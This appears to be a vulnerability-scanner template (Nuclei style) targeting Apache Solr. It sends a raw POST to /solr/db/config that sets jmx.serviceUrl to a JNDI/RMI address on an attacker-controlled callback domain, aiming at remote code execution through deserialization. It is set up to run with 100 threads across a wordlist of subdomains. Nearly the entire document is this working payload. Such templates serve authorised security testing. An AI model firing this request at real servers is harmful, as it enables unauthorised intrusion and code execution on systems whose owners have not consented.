id: ApacheSolr-SSRF-6
info:
  author: 0xAwali
  description: Apache Solr RCE Via Deserialization Of untrusted Data Through jmx.serviceUrl
    , Commonly Bound Ports 8983
  name: Apache Solr RCE
  reference: https://github.com/veracode-research/solr-injection
  severity: critical
requests:
- attack: sniper
  payloads:
    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
  raw:
  - 'POST /solr/db/config HTTP/1.1

    Host: {{Subdomains}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
    like Gecko) Chrome/81.0.4044.138 Safari/537.36

    Accept: */*

    Accept-Encoding: gzip, deflate

    Content-Type: application/json


    {"set-property":{"jmx.serviceUrl":"service:jmx:rmi:///jndi/rmi://{{Host}}.{{Port}}.{{Subdomains}}.apachesolr.{{MY-DOMAIN}}/jmxrmi"}}'
  threads: 100
